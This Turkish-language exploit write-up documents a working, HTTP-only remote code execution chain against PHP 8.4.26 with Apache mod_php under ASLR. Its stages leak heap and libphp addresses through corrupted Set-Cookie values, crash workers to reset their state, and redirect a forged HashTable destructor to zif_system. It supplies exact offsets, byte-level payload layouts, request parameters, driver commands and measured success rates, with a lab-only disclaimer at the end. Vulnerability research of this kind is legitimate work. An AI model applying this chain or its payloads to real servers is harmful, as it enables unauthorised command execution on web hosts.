# Saf HTTP ASLR RCE: iki `Set-Cookie` sızıntısı + `zif_system`

Tarih: 2026-10-21
Hedef: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64, `172.16.0.103`)
Kısıtlar: **tamamen uzaktan, yalnızca HTTP; hedef webroot'ta yalnızca sıradan sayfa var (özel PHP dosyası yok)**.
Durum: **ASLR-on tam zincir çalıştı ve uçtan uca saldırı istekleri tamamen saf HTTP, lab içinde
9/10 (açılış rotasyonuyla) / 5/5 (rotasyonsuz)**. Adres kaynağı iki saf HTTP sızıntısıdır
(Zend MM chunk base, libphp base), terminal `zif_system` kullanır (libc gerektirmez).
Aşamalar arası worker rotasyonu da HTTP ile tetiklenir: `A_bigfields` (3MB canlı POST alanı +
OOM) Zend MM heap'ini bozar, hemen ardından session başlatan bir B isteği gelirse child
`SIGABRT` alır, prefork hemen aynı adres alanına sahip yeni bir worker fork eder.

> Terminoloji: bu belgedeki "saf HTTP", **saldırı istek zincirinin** yalnızca HTTP kullandığı
> anlamına gelir. Lab sürücüsü yine de başlangıçta temiz bir master elde etmek için Apache'yi bir
> kez yeniden başlatır ve sonucu `cat /tmp/p1` ile doğrular; bu iki adım deney ortamı
> operasyonudur, saldırı zincirinde değildir. Saldırı zincirinin kendisi (sızıntı, rotasyon,
> yürütme) yerel sinyal içermez.

---

## 1. Sonuç

Üç istek dizisi (her biri `index.php`'ye sıradan multipart POST):

| Aşama | İstek A | İstek B | Çıktı |
|---|---|---|---|
| 1 | `send_a_leak2.py 1001 12` | `b_numleak2.py 892 1 0x1000` | Zend MM chunk base |
| 2 | `send_a_leak3.py 1001 5 39 12 17` | `b_target.py 443 16 983` | libphp base |
| 3 | `send_a_pad.py 17 19 3 12` + `8:7` + 5×`7:7` | `send_b_zif.py 15 2 <HT> <ZIF>` | `id>/tmp/p1` |

Aşama 1'in mekanizması ve kanıtı için bkz. [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md).
Bu belge aşama 2, 3'ü ve tam sürücüyü kaydeder.

Fiilî test (ASLR açık, `personality=00000000`):

```text
W1=869675 chunk=0x7f4922200000 attempt=1
W2=869737 libphp=0x7f4923a00000 attempt=1
W3=869807 HTDATA=0x7f492226e0d8 ZIF=0x7f4923e3a870 attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
FULL_CHAIN_OK=5/5            # açılış rotasyonu yok (yeniden başlatma sonrası worker zaten fresh)
FULL_PURE_HTTP_OK=9/10       # açılış HTTP rotasyonu dahil (başlangıç geçmişine bağımlılığı ortadan kaldırır)
```

Rotasyon primitifinin ayrı ölçümü:

```text
A_bigfields + session B -> child exit signal Abort (6) -> prefork respawn
fresh worker üzerinde 10/10; sızıntıdan sonra 5/5; rotasyon sonrası tekrar heap sızıntısı 5/5
```

Aşama 2'nin libphp sızıntısı, ASLR altında `/proc/<worker>/maps` ile tamamen tutarlıdır:

```text
Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%A1%87r%7F%00%00
decode: 10 00 00 00 00 00 00 00 | 50 3c a1 87 72 7f 00 00
pDestructor = 0x7f7287a13c50
libphp      = 0x7f7287400000
maps: 7f7287400000-7f728754f000 r--p ... /usr/lib/apache2/modules/libphp.so
```

---

## 2. Aşama 2: libphp kod işaretçisini saf HTTP ile sızdırmak

### 2.1 Fikir

Aşama 1 zaten sarkan `PS(id)`'nin `len`'ini ele geçirip `php_url_encode`'un sınır-dışı okumasını
sağlayabileceğini kanıtladı. Bu aşama "nereyi okuyacağını" **56B HashTable sayfasına** çevirir ve
`len`'i "sahte devasa değer" yerine HashTable içindeki bir **küçük tam sayı alanına** dönüştürür:

- B, iç içe dizi `aNNNN[k]` ile chunk içinde çok sayıda 56B HashTable sayfası serer; her sayfada
  73 HashTable, `pDestructor = ZVAL_PTR_DTOR = libphp + 0x613c50`.
- A'nın şekli (1001 adet 39 baytlık değer alanı) sarkan `PS(id)`'yi
  `chunk + 0xb7400`'e (page `0xb7000`, sayfa içi `+0x400`) koyar.
- Bu adres B'nin yerleşiminde tam olarak `$_POST['a0443']`'ün HashTable'ının `+0x20`'sidir:
  `PS(id)+0x10` `nTableSize | nInternalPointer` okur.
- `a0443`'ü 16 elemana genişlet (`nTableSize=16`, `nInternalPointer=0`),
  `ZSTR_LEN(PS(id)) = 16`; veri `PS(id)+0x18`'den başlar ve tam olarak
  `nNextFreeElement`'i (8B) ve `pDestructor`'ı (8B) kapsar.

Yerleşim (chunk base'e göreli):

```text
PS(id)          = chunk + 0xb7400
PS(id)+0x10     = HT + 0x20  -> nTableSize(16) | nInternalPointer(0) = 16  (len)
PS(id)+0x18     = HT + 0x28  -> nNextFreeElement (0x10)
HT + 0x30       = pDestructor = ZVAL_PTR_DTOR (libphp+0x613c50)
```

`b_target.py`'nin kısıtı:

```text
983 dizi a0000..a0982; bunlardan a0443'ün 16 elemanı var, geri kalanının 1'er
toplam alan = 982 + 16 = 998; PHPSESSID/PROGRESS ile birlikte toplam 1000 POST değişkeni
=> B'nin kendi max_input_vars uyarısını tetiklemez (aksi hâlde headers_sent cookie'yi gönderilemez kılar)
```

### 2.2 Kalibrasyon kaydı (no-ASLR)

- `send_a_leak3.py 1001 5 39 12 17` sonrası, `ps_globals.id = 0x7ffff5eb7400`
  (chunk+0xb7400), `send_cookie=1`.
- 998 adet `aNNNN[0]`'lı orijinal B'de, chunk sayfası `0xb7000` bir 56B HashTable sayfasıdır;
  bu sayfanın `+0x3f0`'ındaki HashTable `$_POST['a0443']`'e aittir (üst bucket'ın `a0443`
  key'inden geri sorgulanarak).
- a0443'ü 16 elemana, geri kalanı 1'er tutmaya çevirdikten sonra, `Set-Cookie` normal 32 karakterlik
  id'den şuna dönüşür:

  ```text
  %10%00%00%00%00%00%00%00P%3C%A1%F4%FF%7F%00%00
  => nNextFreeElement=0x10 | pDestructor=0x7ffff4a13c50
  ```

- Bu pDestructor tam olarak libphp'nin `ZVAL_PTR_DTOR`'udur (`zval_ptr_dtor`),
  offset `0x613c50`. libphp base 2MB hizalıdır, sızıntı doğrulaması olarak kullanılabilir:
  `(pDestructor - 0x613c50) & 0x1fffff == 0` ve
  `pDestructor & 0x1fffff == 0x13c50`.

### 2.3 İstek ayrıntıları

A (`send_a_leak3.py 1001 5 39 12 17`):

- 1001 sıradan alan (5 karakterlik ad, 39 baytlık değer) → 1001.'si
  `max_input_vars` uyarısını tetikler (display_errors=On → headers_sent=1);
- `PHPSESSID` değeri tek bayt `\x00` → FILE_START yeni random id üretir,
  `send_cookie=1`, `php_session_reset_id` headers_sent nedeniyle başarısız olur;
- dosya alanı + 12MB alan → OOM; `PS(id)` sarkan, adres `chunk+0xb7400`.

B (`b_target.py 443 16 983`):

- dosya alanı yok; pre-RINIT END cleanup `php_session_initialize()`'ı çağırır;
- `reset_id` sarkan `PS(id)` ile `Set-Cookie` gönderir;
- `php_url_encode(ZSTR_VAL(id), ZSTR_LEN(id))` 16 bayt okur:
  `nNextFreeElement` + `pDestructor`;
- ardından `ps_files_open`'ın id doğrulaması başarısız olur ve
  `Session ID is too long or contains illegal characters` uyarısı üretir,
  gönderilmiş yanıt başlığını etkilemez.

---

## 3. Aşama 3: `zif_system` terminali

### 3.1 Neden libc kullanılmıyor

Aşama 1/2 yalnızca heap ve libphp'yi sızdırdı; chunk taraması libc işaretçisi bulamadı. Bu yüzden
terminal, PHP'nin kendi internal function handler'ı `zif_system`'i (libphp + `0x43a870`) kullanır,
`system`/libc adresi gerektirmez.

`zif_system(zend_execute_data *execute_data, zval *return_value)`'ın çağrı sözleşmesi (calling convention):

- `pDestructor(&bucket->val)` yalnızca kesin olarak `rdi = &bucket->val`'i verir;
- `&bucket->val`'i bir `zend_execute_data` gibi gösteririz, `num_args=1`,
  `arg1` komut içeren bir fake `zend_string`'e işaret eden bir zval'dir;
- `zif_system` komutu yürüttükten sonra, kontrol-dışı `rsi`'ye dönüş değeri yazarken çökebilir,
  ama komut zaten yürütülmüştür (g18'in `/proc/self/maps` sürümüyle tutarlı).

### 3.2 Kompakt payload (167 bayt, hepsi canlı 192B zend_string içinde)

exploit B'nin fake HashTable'ı canlı bir 167 baytlık alan değeri string'inde durur
(`chunk + 0x6e0d8`); fake reference 55B raw buffer ile
`R0 = chunk + 0x24e0`'deki sarkan reference'ın üzerine yazar.

```text
data+0x00: gc refcount=1, type=IS_ARRAY(7)
data+0x08: flags=0x10, nTableMask=0xfffffff8
data+0x10: arData = data+0x20
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = zif_system          (== execute_data+0x10)
data+0x20: execute_data E (0x50 bayt)
  E+0x10: return_value = zif_system          (HT pDestructor ile örtüşür)
  E+0x2C: num_args = 1
  E+0x50: arg1 zval { value=data+0x80, type=IS_STRING(6) }
data+0x80: fake zend_string { gc 1/0x106, h=0, len=10, chars at 0x98 }
data+0x98: "id>/tmp/p1\0"
```

fake reference (55B raw buffer, başlangıç `R0-0x10`):

```text
+0x10: gc refcount=1, type=IS_REFERENCE(10)
+0x18: val.value = chunk+0x6e0d8
+0x20: val.type  = 0x307 (IS_ARRAY_EX)
+0x28: sources   = 0
```

Tetik zinciri:

```text
php_session_track_init()
  zval_ptr_dtor(PS(http_session_vars))     # refcount 1 -> 0
    zend_reference_destroy(R0)
      zval_ptr_dtor(&ref->val)             # IS_ARRAY_EX
        zend_array_destroy(fake HT)
          zend_hash_destroy(fake HT)
            pDestructor(&bucket->val)      # = zif_system
              zif_system(execute_data)     # "id>/tmp/p1"
```

### 3.3 exploit istek şekli (`use_cookies=1` altında kalibre edilmiş)

- A: `send_a_pad.py 17 19 3 12 8:7 7:7 7:7 7:7 7:7 7:7`
  - 6 pad sarkan reference'ı `R0 = chunk + 0x24e0` yapar,
    `R0-0x10` 56B blok başlangıcıdır;
- B: `send_b_zif.py 15 2 <HTDATA> <ZIF> "id>/tmp/p1"`
  - `N1=15` (31 karakterlik priming alan) iken 55B fake-ref raw buffer `R0-0x10`'a düşer;
  - `HTDATA = chunk+0x6e0d8` (canlı 167B string data);
  - `ZIF = libphp+0x43a870`.

> Dikkat: `use_cookies`'in 0'dan 1'e değişmesi B'nin 56B düşüş noktasını `N1=16`'dan
> `N1=15`'e taşır ve sızıntı A'sının bazı offset'lerini değiştirir; yukarıdaki parametrelerin
> hepsi `use_cookies=1` altında ölçülmüştür.

---

## 4. Tam sürücü

`tools/pure_aslr_run.sh`:

1. Apache'yi yeniden başlat (ASLR açık, tek worker prefork);
2. Aşama 1: `send_a_leak2 + b_numleak2`, `Set-Cookie`'den chunk base ayrıştır
   (2MB hizalı en sık değer); başarısızlıkta 3 kez tekrar;
3. worker'ı döndür (HTTP): `send_a_bigfields 1001 3000 12 17` →
   `sup_poc.py b`, prefork'un yeni child fork etmesini bekle;
4. Aşama 2: `send_a_leak3 + b_target`,
   `pDestructor`'ı ayrıştır, `p & 0x1fffff == 0x13c50`'yi doğrula; başarısızlıkta 3 kez tekrar;
5. worker'ı döndür (yukarıdaki gibi);
6. Aşama 3: `send_a_pad + send_b_zif`, `/tmp/p1`'i kontrol et; başarısızlıkta 5 kez tekrar.

Sürücü varsayılan olarak aşama 1'den önce de bir HTTP rotasyonu yapar, önce geçmişi olabilecek
mevcut child'ı öldürür, böylece ilk aşamanın yerleşimi yalnızca bu zincirin istek dizisine bağlı olur.

```bash
# Hedef makine
cd ~/php2shell-work
CMD="id>/tmp/p1" bash pure_aslr_run.sh
```

Fiilî çıktı (5/5):

```text
W1=... chunk=0x...
W2=... libphp=0x...
W3=... HTDATA=0x... ZIF=0x... attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Kanıt arşivi: `logs/pure_http_aslr_20261021.txt`;
libphp sızıntısı ham yanıtı: `logs/libphp_leak_20261021.resp`.

---

## 5. worker rotasyonu ve ASLR base kararlılığı

- Aynı Apache master altında, prefork'un yeniden fork ettiği child proses aynı
  **libphp/libc** eşlemelerini devralır; Zend MM chunk bu child'ın ilk isteğinde mmap edilir,
  worker'ı yeniden başlattıktan sonra chunk base ile libphp base'in ikisinin de değişmediği
  fiilen ölçüldü:

  ```text
  W1 chunk=0x7f5555e00000 libphp=0x7f5553a00000
  W2 chunk=0x7f5555e00000 libphp=0x7f5553a00000   # child abort/fork edildikten sonra
  ```

- Aşamalar arasında mutlaka bir **fresh worker** değiştirilmeli: her aşamanın A/B offset'i
  "worker'ın ilk isteği" üzerinde kalibre edilmiştir. worker bir sızıntı isteğine hizmet ettikten
  sonra A'nın sarkan reference adresi kayar (fiilen `R0` `chunk+0x24e0`'den `chunk+0x14e0`'e
  kaydı), eski B düşüş noktası geçersiz olur.
- **Saf HTTP rotasyonu (uygulandı)**: `A_bigfields` 1001 sıradan alan gönderir (ilk 1000'i
  `$_POST` olarak kayıtlı, her biri 3000 bayt) → FILE_START yeni id oluşturur → 12MB alan OOM yapar.
  3MB canlı string + OOM, Zend MM'in heap durumunu bozar; hemen ardından session başlatan bir
  B (`sup_poc.py b`: PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS, dosya alanı yok,
  pre-RINIT END cleanup yolunu izler) `zend_mm_panic`/`abort()`'u tetikler, child
  **SIGABRT** ile çıkar, prefork hemen yeni child fork eder. Log doğrular:

  ```text
  [core:notice] child pid ... exit signal Abort (6)
  ```

  Fiilî test: fresh worker 10/10, sızıntı sonrası 5/5, rotasyon sonrası tekrar sızıntı 5/5.
- Rotasyon sonrası yeni child, eski child ile aynı master'ın mmap yerleşimini paylaşır, bu yüzden
  chunk base ile libphp base'in ikisi de değişmez; "bir kez sızdır, worker değiştir, kullanmaya
  devam et"in ön koşulu budur.
- Varsayılan sürücü aşama 1'den önce de bir HTTP rotasyonu yapar, böylece hedef worker bilinmeyen
  bir isteğe hizmet etmiş olsa bile ilk aşamanın yerleşimi yalnızca bu zincirin istek dizisine bağlı olur.

---

## 6. Sınırlar

1. `display_errors=On`'a bağlıdır (aşama 1/2'nin A'sı `headers_sent=1` ayarlamak için uyarı
   çıktısına ihtiyaç duyar).
   > 2026-10-21 güncellemesi: `display_errors`'a bağlı olmayan OOM-in-cookie varyantı A'nın
   > OOM'unu `php_session_send_cookie→php_url_encode`'a soktu (bin 128 boş +
   > free page tükenmesi) ve B tarafında sarkan `PS(mod_data)`'yı aşarak sarkan id ile
   > `send_cookie`'yi çağırdı; kalan iş sarkan id bloğunun forge kalibrasyonudur. Ayrıntılar için
   > bkz. [DISPLAY_ERRORS_OFF.md](/Users/my/php2shell/DISPLAY_ERRORS_OFF.md).
2. `session.use_cookies=1` (varsayılan), `session.use_strict_mode=0`
   (varsayılan), `max_input_vars=1000` (varsayılan), `memory_limit=8M` (lab) değerlerine bağlıdır.
3. Tüm chunk/modül içi offset'ler bu PHP 8.4.26 build'ine ve istek şekline bağlıdır:

   ```text
   chunk+0xb7400   stage-2 stale PS(id)
   chunk+0xb73f0   target HashTable (a0443)
   chunk+0x6e0d8   stage-3 fake HashTable string data
   chunk+0x24e0    stage-3 stale reference R0
   libphp+0x613c50 ZVAL_PTR_DTOR
   libphp+0x43a870 zif_system
   ```

   build/alan uzunluğu/istek sırası değişince `logs` içindeki gdb yöntemine göre yeniden kalibre
   etmek gerekir; bu offset'lerin hepsi chunk/modül içi göreli değerlerdir, ASLR'den bağımsızdır.
4. Komut yürütüldükten sonra worker, `zend_hash_destroy`'ın kapanış `pefree`'sinde çöker;
   proof zaten yazılmıştır, tek seferlik exploit için beklenen davranıştır.
5. Aşama 1 ile aşama 2'nin A şekli farklıdır, ama ikisi de aynı "headers_sent + boş
   PHPSESSID + OOM" primitifine dayanır; ikisi de A'nın worker'ın fresh isteği olmasını gerektirir.
   Fresh durum HTTP rotasyonuyla garanti edilir: `send_a_bigfields.py 1001 3000 12 17` (~3MB alan
   istek gövdesi) + `sup_poc.py b`. Bu rotasyon, 12MB alanın OOM olması için `memory_limit=8M`'ye
   bağlıdır ve bir sonraki isteğin Zend MM kapanışında abort olmasını sağlar.
6. Başarı oranı (lab, ASLR-on): açılış rotasyonu olmadan **5/5**; açılış rotasyonu ile (başlangıç
   geçmişi bağımlılığını ortadan kaldırır) **9/10**. Başarısızlıklar çoğunlukla zamanlama/tekrar
   sorunudur, sürücü aşama düzeyinde tekrar içerir; "on seferde bir" gereksiniminin çok üzerindedir.
7. Hedefin `memory_limit`'i çok büyükse, `A_bigfields`'ın OOM'u daha büyük bir kuyruk alanı
   gerektirir; rotasyon primitifi "önce heap'i tüket/boz, sonra session başlatmanın abort
   tetiklemesini sağla" gerektirir, ikisi de hedef yapılandırmaya göre yeniden kalibre edilmelidir.

---

## 7. Dosyalar

| Dosya | Amaç |
|---|---|
| `tools/pure_aslr_run.sh` | Tam zincir sürücüsü (sızıntı→rotasyon→exploit, doğrulama/tekrar dahil) |
| `tools/send_a_leak2.py` | Aşama 1 A (heap sızıntısı prime) |
| `tools/b_numleak2.py` | Aşama 1 B (80B raw forge + sınır-dışı okuma) |
| `tools/decode_leak.py` | Aşama 1 yanıt decode/chunk base |
| `tools/send_a_leak3.py` | Aşama 2 A (`PS(id)=chunk+0xb7400`) |
| `tools/b_target.py` | Aşama 2 B (a0443 16 elemana genişletilir → pDestructor sızdırır) |
| `tools/send_a_pad.py` | Aşama 3 A (6 pad + dosya + OOM) |
| `tools/send_b_zif.py` | Aşama 3 B (kompakt zif_system payload) |
| `tools/send_b_rce2.py` | Eski sürüm system terminali (no-ASLR baseline/çökme deneyi) |
| `tools/send_a_bigfields.py` | HTTP rotasyon A (3MB canlı alan + OOM) |
| `tools/sup_poc.py` | HTTP rotasyon B (session başlatma SIGABRT tetikler) |
| `tools/b_crash7.py` | Erken HTTP çökme primitifi deneyi (7 karakterlik live string) |
| `logs/http_heap_leak_20261021.resp/.txt` | Aşama 1 ham yanıt/decode |
| `logs/libphp_leak_20261021.resp` | Aşama 2 ham yanıt |
| `logs/pure_http_aslr_20261021.txt` | Saf HTTP tam zincir çalıştırma kaydı (5/5, 9/10) |

---

## 8. Sorumluluk reddi

Yalnızca yetkili ortamlarda güvenlik açığı araştırması ve çoğaltma amaçlıdır. İstek şekilleri,
bin dizileri ve offset'ler bu lab'ın PHP 8.4.26 build'ine ve Apache/mod_php yapılandırmasına
bağlıdır; build ya da yapılandırma değişince yeniden kalibrasyon gerekir.
